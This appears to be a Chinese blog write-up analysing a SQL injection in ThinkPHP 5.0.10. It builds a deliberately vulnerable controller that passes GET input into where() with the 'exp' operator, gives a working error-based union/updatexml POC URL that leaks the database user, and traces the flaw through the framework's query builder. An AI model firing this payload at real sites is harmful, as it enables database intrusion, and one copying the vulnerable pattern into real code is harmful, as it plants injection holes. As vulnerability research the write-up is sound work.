---
title: "Thinkphp5 SQL注入漏洞分析"
date: 2023-04-14T22:41:18+08:00
tags: ["web漏洞分析","SQL注入"]
categories: ["web漏洞分析"]
draft: false
---

## 环境准备

```bash
composer create-project --prefer-dist topthink/think=5.0.10 tpdemo
```

将 `composer.json` 文件的 `require` 字段设置成如下：

```json
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.10"
}
```

执行 `composer update`

创建数据库和表，插入测试数据：

```bash
create database tpdemo;

create table users(
    id int primary key auto_increment,
    username varchar(50) not null
);

insert into users(id,username) values(1,'fan');
```

更改配置:
`application/config.php`：设置 `app_debug` true, `app_trace` true
`application/database.php`: 设置数据库的相关信息

在 `application/index/controller/Index.php` 中添加如下代码：

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username');
        $result = db('users')->where('username','exp',$username)->select();
        return 'select success';
    }
}
```

## POC

```url
http://192.168.121.131:9999/index.php?username=)+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23
```

![poc_result](/images/thinkphp5_sql_injection/poc_result.png)

## 分析

这里通过debug分析造成SQL注入的原因：

![debug_1](/images/thinkphp5_sql_injection/debug_1.png)

请求传递`username`参数并没有做处理传递了`where`条件，先调用 `Query` 类的 `where` 方法，通过其 `parseWhereExp` 方法分析查询表达式，然后再返回并继续调用 `select` 方法准备开始构建 `select` 语句。

![debug_2](/images/thinkphp5_sql_injection/debug_2.png)

在 `select` 方法中，程序会对 `SQL` 语句模板用变量填充，其中用来填充 `%WHERE%` 的变量中存在用户输入的数据。

![debug_3](/images/thinkphp5_sql_injection/debug_3.png)

继续跟进 `buildWhere` 函数

![debug_4](/images/thinkphp5_sql_injection/debug_4.png)

发现用户可控数据又被传入了 `parseWhereItem` `where`子单元分析函数。

![debug_5](/images/thinkphp5_sql_injection/debug_5.png)

我们发现当操作符等于 `EXP` 时，将来自用户的数据直接拼接进了 SQL 语句造成了SQL注入

![debug_6](/images/thinkphp5_sql_injection/debug_6.png)
